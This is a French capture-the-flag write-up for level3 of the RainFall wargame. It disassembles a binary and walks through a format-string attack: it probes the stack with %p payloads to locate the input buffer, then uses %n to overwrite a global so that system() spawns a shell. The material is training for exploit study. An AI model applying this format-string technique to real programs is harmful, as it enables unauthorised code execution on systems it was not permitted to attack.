les étapes afin de réussir : Comprendre le binaire donné
disas v
```Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>  // ici on voit que le buffer est protégé
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt> // un printf qui prend une string (Format String Attack)
   0x080484da <+54>:	mov    0x804988c,%eax         // une variable non initalisé
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret```

   On va chercher à initialisé la variable 0x804988c afin d'avoir 0x40 soit 64

  Pour cela on va essayé d'aller jusqu'à notre adresse avec  la première commande
  le résultat est `� 200 b7fd1ac0 b7ff37d0 804988c`

  on va essayé d'écrire quelques chose dans les adresses avec la deuxième commande
  puis on va chercher à écrire au 4 ème vu que notre adresse au dessus est la 4 eme
  ```level3@RainFall:~$ python -c  'print "aaaaaa" + "%p "*10' | ./level3
  aaaaaa0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x70256161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
  level3@RainFall:~$ python -c  'print "aaaaaaa" + "%4$p "' | ./level3
  aaaaaaa0x61616161``

  Le %p servait à voir ce qu'on tester maintenant il suffit de le remplacé par le %n pour écrire
  avec la dernière command python, puis il nous suffit de lancer le programme avec notre exploit
  et HOP nous avons notre terminal
